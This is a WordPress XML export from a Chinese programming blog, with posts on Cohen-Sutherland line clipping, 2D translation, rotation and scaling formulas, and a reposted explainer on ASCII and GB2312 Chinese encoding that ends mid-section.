		<link>http://codemylife.blogcn.com/2011/11/cohen-sutherland-%e7%ba%bf%e8%a3%81%e5%89%aa%e7%ae%97%e6%b3%95/cohen-sutherland_eg1/</link>
		<pubDate>Mon, 28 Nov 2011 10:05:46 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/03/DD/wKgKC07TXPoAAAAAAAAsCnta-Ho243.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>157</wp:post_id>
		<wp:post_date>2011-11-28 18:05:46</wp:post_date>
		<wp:post_date_gmt>2011-11-28 10:05:46</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cohen-sutherland_eg1</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>155</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/03/DD/wKgKC07TXPoAAAAAAAAsCnta-Ho243.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"238";s:6:"height";s:3:"182";s:14:"hwstring_small";s:23:"height='96' width='125'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/03/60/wKgKCk7TXPsAAAAAAAANRHh7GSQ146.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"143";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/03/DD/wKgKC07TXPsAAAAAAAAdFy2a2ug286.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/04/8D/wKgKDE7TXPsAAAAAAAAsCiF-BGc502.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>lineClip</title>
		<link>http://codemylife.blogcn.com/2011/11/cohen-sutherland-%e7%ba%bf%e8%a3%81%e5%89%aa%e7%ae%97%e6%b3%95/lineclip/</link>
		<pubDate>Tue, 29 Nov 2011 14:02:20 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp02/M00/03/65/wKgKCk7U5ewAAAAAAAPoOkxVOCo708.bmp</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>158</wp:post_id>
		<wp:post_date>2011-11-29 22:02:20</wp:post_date>
		<wp:post_date_gmt>2011-11-29 14:02:20</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>lineclip</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>155</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp02/M00/03/65/wKgKCk7U5ewAAAAAAAPoOkxVOCo708.bmp</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Cohen-Sutherland 线裁剪算法</title>
		<link>http://codemylife.blogcn.com/2011/11/cohen-sutherland-%e7%ba%bf%e8%a3%81%e5%89%aa%e7%ae%97%e6%b3%95/</link>
		<pubDate>Tue, 29 Nov 2011 14:07:39 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[图形学]]></category>

		<category domain="tag" nicename="%e5%9b%be%e5%bd%a2%e5%ad%a6"><![CDATA[图形学]]></category>

		<category><![CDATA[计算机图形学导论]]></category>

		<category domain="category" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%9b%be%e5%bd%a2%e5%ad%a6%e5%af%bc%e8%ae%ba"><![CDATA[计算机图形学导论]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=155</guid>
		<description></description>
		<content:encoded><![CDATA[寻找本身就是一种幸福。

Cohen-Sutherland 算法是一种很有效的裁剪算法，其整体思想是：每一条线或整体的位于窗口的内部，或者能够被分割而使其中的一部分很快的被删去。
<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp04/M00/03/23/wKgKDE7SHwgAAAAAAAARWRnmyRg657.jpg" alt="" />
Cohen-Sutherland 算法将平面划分成9个区域，每个区域分配一个4位的代码，代码是根据裁剪矩形的边定义的外半平面和各区域的相对关系来决定的。

简记：“1上2下，3左4右”，（位是从左至右）。

这样的划分，可以得到一个简单的计算外码的方式：各位的值可分别根据(y<sub>max</sub> - y), (y - <sub>min</sub>), (x<sub>max</sub> - x), (x - x<sub>min</sub>)的符号决定，然后线段的每个端点可以根据它所在的区域被赋予该区域的代码。

《计算机图形学导论》上介绍的算法，是这样的：
<ul>
	<li>从上到下，从左至右去检测哪条边会与这条线相交。外码的特点是非零位对应于这条线会相交的边。</li>
	<li>计算线段的两个端点的外码，并检测它们是否能简单接受或拒绝。</li>
	<li>如果不能，选择一个在外面的点，然后找出会与该线相交的边，求出交点。</li>
	<li>去掉外面点到交点的这一段，并将交点作为裁剪后的线段的一个新的端点。</li>
	<li>计算新的端点的外码，并进行下一次检测。</li>
</ul>
<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp01/M00/03/DD/wKgKC07TXPoAAAAAAAAsCnta-Ho243.jpg" alt="" width="238" height="182" />《Windows 游戏编程大师技巧》里面介绍的算法本质上是一样的，只是根据实际情况：比如线段ED，HD这一部分肯定只与裁剪矩形的一条边延长线相交，那么按照从上到下，从左到右的步骤，分别裁剪掉FD，再裁剪掉HF。这样就不用循环了，其实本质还是一样的。

如下裁剪Demo：
<img src="http://files.blogcn.com/wp02/M00/03/65/wKgKCk7U5ewAAAAAAAPoOkxVOCo708.bmp" alt="" />

由于检测和裁剪是按照一个固定的次序运行的，所以该算法有时会做一些不必要的裁剪。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>155</wp:post_id>
		<wp:post_date>2011-11-29 22:07:39</wp:post_date>
		<wp:post_date_gmt>2011-11-29 14:07:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cohen-sutherland-%e7%ba%bf%e8%a3%81%e5%89%aa%e7%ae%97%e6%b3%95</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358914]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[29]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>三角函数</title>
		<link>http://codemylife.blogcn.com/2012/05/2d-%e5%b9%b3%e9%9d%a2%e5%8f%98%e6%8d%a2/%e4%b8%89%e8%a7%92%e5%87%bd%e6%95%b0/</link>
		<pubDate>Mon, 05 Dec 2011 07:53:11 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/01/D8/wKgKDU7ceGcAAAAAAAA7GTNTAE8086.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>161</wp:post_id>
		<wp:post_date>2011-12-05 15:53:11</wp:post_date>
		<wp:post_date_gmt>2011-12-05 07:53:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%b8%89%e8%a7%92%e5%87%bd%e6%95%b0</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>160</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/01/D8/wKgKDU7ceGcAAAAAAAA7GTNTAE8086.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"300";s:6:"height";s:3:"209";s:14:"hwstring_small";s:23:"height='89' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/8C/wKgKCk7ceGgAAAAAAAARGmt8Gag449.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"130";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/02/F4/wKgKC07ceGgAAAAAAAAlkXK0x_w511.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/03/01/wKgKC07ceGgAAAAAAAA7GWkuP0c444.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>sincos</title>
		<link>http://codemylife.blogcn.com/2012/05/2d-%e5%b9%b3%e9%9d%a2%e5%8f%98%e6%8d%a2/sincos/</link>
		<pubDate>Tue, 03 Jan 2012 09:21:21 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp04/M00/03/8A/wKgKDE8CyJEAAAAAAAAqWw7Fr5E545.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>162</wp:post_id>
		<wp:post_date>2012-01-03 17:21:21</wp:post_date>
		<wp:post_date_gmt>2012-01-03 09:21:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sincos</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>160</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp04/M00/03/8A/wKgKDE8CyJEAAAAAAAAqWw7Fr5E545.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"300";s:6:"height";s:3:"200";s:14:"hwstring_small";s:23:"height='85' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/03/8B/wKgKDU8CyJIAAAAAAAATElcnyvY640.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"125";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/03/4B/wKgKC08CyJEAAAAAAAAmzn8XgXo579.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/04/69/wKgKC08CyJEAAAAAAAAqW1X1ujI587.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>2D 平面变换</title>
		<link>http://codemylife.blogcn.com/2012/05/2d-%e5%b9%b3%e9%9d%a2%e5%8f%98%e6%8d%a2/</link>
		<pubDate>Mon, 07 May 2012 12:21:56 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category domain="category" nicename="tricks-of-the-windows-game-progrmming"><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<category domain="tag"><![CDATA[读书]]></category>

		<category domain="tag" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=160</guid>
		<description></description>
		<content:encoded><![CDATA[君，当如竹，坚韧挺拔显气概。

<strong>平移</strong>

平移就是将一个对象或一个点从一个地方移动到另一个地方。设点(x, y)，将其平移一定距离(dx, dy)，移动到新位置(xt, yt)，则其计算过程：
<ul>
	<li>xt = x + dx;</li>
	<li>yt = y + dy;</li>
</ul>
平移整个对象时，如果你有对象中心的坐标，而且所有点有对应中心的相对坐标，那么只需要对对象的中心应用平移变换即可。如果对象没有自己的坐标，那么你就必须对组成整个多边形的所有点运用公式。

本地坐标和世界坐标：通常在2D或3D计算机图像里，你至少需要给所有对象确定本地坐标和世界坐标。一个对象的本地坐标是相对于 (0, 0) 或 (0, 0, 0)，然后给每个本地坐标位置加上世界坐标方位(x0, y0) 或 (x0, y0, z0)，就可以找到对象的世界坐标位置。实际上，也就是通过把每个本地坐标转换，来<strong>重新放置对象</strong>。

<strong>旋转</strong>

三角函数：
<img class="alignnone" src="http://files.blogcn.com/wp06/M00/01/D8/wKgKDU7ceGcAAAAAAAA7GTNTAE8086.png" alt="" width="240" height="167" /><img class="alignright" style="float: right;" src="http://files.blogcn.com/wp04/M00/03/8A/wKgKDE8CyJEAAAAAAAAqWw7Fr5E545.png" alt="" width="300" height="200" />

常用公式：
<ul>
	<li>毕达哥拉斯定理：sinΘ<sup>2 </sup>+ cosΘ<sup>2</sup> = 1</li>
	<li>变换恒等式：sinΘ = cos(Θ - Π/2)</li>
	<li>负角公式：sin(-Θ) = - sinΘ, cos(-Θ) = cosΘ</li>
	<li>和差化积公式：sin(α + β) = sinα * cosβ + cosα * sinβ, cos(α + β) = cosα * cosβ - sinα * sinβ, sin (α - β)  = sinα * cosβ  -  cosα * sinβ, cos(α - β)  = cosα * cosβ + sinα * sinβ</li>
</ul>
绕点旋转公式的推导：

设点 p1(x1, y1) 绕点 p0(x0, y0) 逆时针旋转 α 度之后为 p2(x2, y2)，那么在p0(x0, y0) 建立一个直角坐标系，设 p0p1 线段成为 r，与 x 轴夹角为 Θ，那么可以得出以下等式：
<ul>
	<li>x1 = r * cos Θ, y1 = r * sinΘ</li>
	<li>x2 = r * cos(Θ + α), y2 = r * sin(Θ + α)</li>
</ul>
将2 式使用和差化积转换为：
x2 = r * cosΘ * cosα  - r * sinΘ * sinα
y2 = r * sinΘ * cosα + r * cosΘ * sinα

将1式代入，得：
x2 = x1 * cosα - y1 * sinα
y2 = x1 * sinα + y1 * cosα

由于之前有过平移，平移因子(x0, y0)，故：
x2 - x0 = (x1 - x0) * cosα - (y1 - y0) * sinα 即：<span style="color: #0000ff;">x2 = (x1 - x0) * cosα - (y1 - y0) * sinα + x0</span>
y2 - y0 = (x1 - x0) * sinα + (y1 - y0) * cosα即：<span style="color: #0000ff;">y2 = (x1 - x0) * sinα + (y1 - y0) * cosα + y0</span>

<strong>缩放</strong>

缩放几乎和平移一样，要将对象进行缩放，只需要将每个坐标都乘以缩放因子即可。当然，你可以在不同的轴上的数值采用不同比例的缩放。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>160</wp:post_id>
		<wp:post_date>2012-05-07 20:21:56</wp:post_date>
		<wp:post_date_gmt>2012-05-07 12:21:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>2d-%e5%b9%b3%e9%9d%a2%e5%8f%98%e6%8d%a2</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358872]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[34]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>ascii0</title>
		<link>http://codemylife.blogcn.com/2012/05/%e4%b8%ad%e6%96%87%e7%bc%96%e7%a0%81%e6%9d%82%e8%b0%88/ascii0/</link>
		<pubDate>Mon, 07 May 2012 12:41:28 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/06/6E/wKgKC0-nwvgAAAAAAAFBaE93umE512.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>164</wp:post_id>
		<wp:post_date>2012-05-07 20:41:28</wp:post_date>
		<wp:post_date_gmt>2012-05-07 12:41:28</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ascii0</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>163</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/06/6E/wKgKC0-nwvgAAAAAAAFBaE93umE512.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"500";s:6:"height";s:3:"393";s:14:"hwstring_small";s:23:"height='96' width='122'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/05/18/wKgKCk-nwvkAAAAAAAATimCBUUg698.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"147";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/06/6E/wKgKC0-nwvkAAAAAAABGrhqI5NQ619.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"388";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/05/35/wKgKCk-nwvkAAAAAAAGQHhCWRSg034.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/06/FE/wKgKDE-nwvkAAAAAAAFBaDfNSQ4680.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>中文编码杂谈</title>
		<link>http://codemylife.blogcn.com/2012/05/%e4%b8%ad%e6%96%87%e7%bc%96%e7%a0%81%e6%9d%82%e8%b0%88/</link>
		<pubDate>Mon, 07 May 2012 13:18:08 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[技术]]></category>

		<category domain="category" nicename="%e6%8a%80%e6%9c%af"><![CDATA[技术]]></category>

		<category domain="tag"><![CDATA[编码]]></category>

		<category domain="tag" nicename="%e7%bc%96%e7%a0%81"><![CDATA[编码]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=163</guid>
		<description></description>
		<content:encoded><![CDATA[转自<a href="http://www.searchtb.com/2012/04/chinese_encode.html">中文编码杂谈</a>，很好的一篇讲中文编码的文章，感谢原作者分享！

<strong>编码问题的例子</strong>
在windows自带的notepad（记事本）程序中输入“联通”两个字，保存后再次打开，会发现“联通”不见了，代之以“��ͨ”的乱码。这是windows平台上典型的中文编码问题。即文件保存的时候是按照ANSI编码（其实就是GB2312，后面会详细介绍）保存，打开的时候程序按照UTF-8方式对内容解释，于是就出现了乱码。避免乱码的方式很简单，在“文件”菜单中选择“打开”命令，选择保存的文件，然后选择“ANSI”编码，此时就能看到久违的“联通”两个字了。

在Linux平台上如果使用cat等命令查看文件中的中文内容时，可能出现乱码。这也是编码的问题。简单的说是文件时按照A编码保存，但是cat命令按照当前Locale设定的B编码去查看，在B和A不兼容的时候就出现了乱码。

<strong>为什么写这篇文章</strong>
中文编码由于历史原因牵扯到不少标准，在不了解的时候感觉一头雾水；但其实理解编码问题并不需要你深入了解各个编码标准，只要你明白了来龙去脉，了解了关键的知识点，就能分析和解决日常开发工作中碰到的大部分编码问题。有感于我看过的资料和文章要么不够全面，要么略显枯燥，所以通过这篇文章记录下笔者在日常工作中碰到的中文编码原理相关问题，目的主要是自我总结，如果能给读者提供一些帮助那就算是意外之喜了。由于严谨的编码标准对我来说是无趣的，枯燥的，难以记忆的，本文尝试用浅显易懂的生活语言解释中文编码相关的（也可能不相关的）一些问题，这也是为什么取名杂谈的原因。本文肯定存在不规范不全面的地方，我会在参考资料里给出官方文档的链接，也欢迎读者在评论中提出更好的表达方式&amp;指出错误，不胜感激。

对编码问题的理解我认为分为三个层次，第一个层次：概念，知道各个编码标准的应用场景，了解之间的差异，能分析和解决常见的一些编码问题。第二个层次：标准，掌握编码的细节，如编码范围，编码转换规则，知道这些就能自行开发编码转换工具。第三个层次，使用，了解中文的编码2进制存储，在程序开发过程中选择合理的编码并处理中文。为了避免让读者陷入编码标准的黑洞无法脱身（不相信？看看unicode的规范就明白我的意思了），同时由于编码查询&amp;转换工具等都有现成工具可以使用，本文只涉及第一个层次，不涉及第二层次，在第三层次上会做一些尝试。在本文的最后提供了相关链接供对标准细节感兴趣的同学继续学习。最后，本文不涉及具体软件的乱码问题解决，如ssh，shell，vim，screen等，这些话题留给剑豪同学专文阐述。

<strong>一切都是因为电脑不识字</strong>
电脑很聪明，可以帮我们做很多事情，最开始主要是科学计算，这也是为什么电脑别名计算机。电脑又很笨，在她的脑子里只有数字，即所有的数据在存储和运算时都要使用二进制数表示。这在最初电脑主要用来处理大量复杂的科学计算时不是什么大问题但是当电脑逐步走入普通人的生活时，情况开始变遭了。办公自动化等领域最主要的需求就是文字处理，电脑如何来表示文字呢？这个问题当然难不倒聪明的计算机科学家们，用数字来代表字符呗。这就是“编码”。

<strong>英文的终极解决方案：ASCII</strong>
每个人都可以约定自己的一套编码，只要使用方之间了解就ok了。比如说咱俩约定0×10表示a，0×11表示b。在一开始也的确是这样的，出现了各式各样的编码。这样有两个问题：1.各个编码的字符集不一样，有的多，有的少。2.相同字符的编码也不一样。你这里a是0×10.他那里a可能是0×30。于是你保存的文件他就不能直接用，必须要转换编码。随着沟通范围的扩大，采用不同编码的人们互相通信就乱套了，这就是我们常说的：鸡同鸭讲。如果要避免这种混乱，那么大家就必须使用相同的编码规则，于是美国有关的标准化组织就出台了ASCII（American Standard Code for Information Interchange）编码，统一规定了英文常用符号用哪些二进制数来表示。ASCII是标准的单字节字符编码方案，用于基于文本的数据。

ASCII最初是美国国家标准，供不同计算机在相互通信时用作共同遵守的西文字符编码标准，已被国际标准化组织（International Organization for Standardization, ISO）定为国际标准，称为ISO 646标准。适用于所有拉丁文字字母。ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数来表示所有的大写和小写字母，数字0 到9、标点符号， 以及在美式英语中使用的特殊控制字符。而最高位为1的另128个字符（80H—FFH）被称为“扩展ASCII”，一般用来存放英文的制表符、部分音标字符等等的一些其它符号。

其中：0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），32～126(共95个)是字符(32是空格），其中48～57为0到9十个阿拉伯数字，65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。
<img style="vertical-align: text-top;" src="http://files.blogcn.com/wp01/M00/06/6E/wKgKC0-nwvgAAAAAAAFBaE93umE512.jpg" alt="" width="500" height="393" />
现在所有使用英文的电脑终于可以用同一种编码来交流了。理解了ASCII编码，其他字母型的语言编码方案就触类旁通了。

<strong>一波三折的中文编码</strong>
<strong> 第一次尝试：GB2312</strong>
ASCII这种字符编码规则显然用来处理英文没有什么问题，它的出现极大的促进了信息在西方尤其是美国的传播和交流。但是对于中文，常用汉字就有6000以上，ASCII 单字节编码显然是不够用。为了粉碎美帝国主义通过编码限制中国人民使用电脑的无耻阴谋，中国国家标准总局发布了GB2312码即中华人民共和国国家汉字信息交换用编码，全称《信息交换用汉字编码字符集——基本集》，1981年5月1日实施，通行于大陆。GB2312字符集中除常用简体汉字字符外还包括希腊字母、日文平假名及片假名字母、俄语西里尔字母等字符，未收录繁体中文汉字和一些生僻字。 EUC-CN可以理解为GB2312的别名，和GB2312完全相同。

GB2312是基于区位码设计的，在区位码的区号和位号上分别加上A0H就得到了GB2312编码。这里第一次提到了“区位码”，我就连带把下面这几个让人摸不到头脑的XX码一锅端了吧：

<strong>区位码，国标码，交换码，内码，外码</strong>

<strong>区位码</strong>：就是把中文常用的符号，数字，汉字等分门别类进行编码。区位码把编码表分为94个区，每个区对应94个位，每个位置就放一个字符（汉字，符号，数字都属于字符）。这样每个字符的区号和位号组合起来就成为该汉字的区位码。区位码一般用10进制数来表示，如4907就表示49区7位，对应的字符是“学”。区位码中01-09区是符号、数字区，16-87区是汉字区，10-15和88-94是未定义的空白区。它将收录的汉字分成两级：第一级是常用汉字计3755个，置于16-55区，按汉语拼音字母/笔形顺序排列；第二级汉字是次常用汉字计3008个，置于56-87区，按部首/笔画顺序排列。在网上搜索“区位码查询系统”可以很方便的找到汉字和对应区位码转换的工具。为了避免广告嫌疑和死链，这里就不举例了。

<strong>国标码</strong>： 区位码无法用于汉字通信，因为它可能与通信使用的控制码（00H~1FH）（即0~31，还记得ASCII码特殊字符的范围吗？）发生冲突。于是ISO2022规定每个汉字的区号和位号必须分别加上32（即二进制数00100000，16进制20H），得到对应的国标交换码，简称国标码，交换码，因此，“学”字的国标交换码计算为：

00110001 00000111
+ 00100000 00100000
-------------------
01010001 00100111
用十六进制数表示即为5127H。

<strong>交换码</strong>：即国标交换码的简称，等同上面说的国标码。

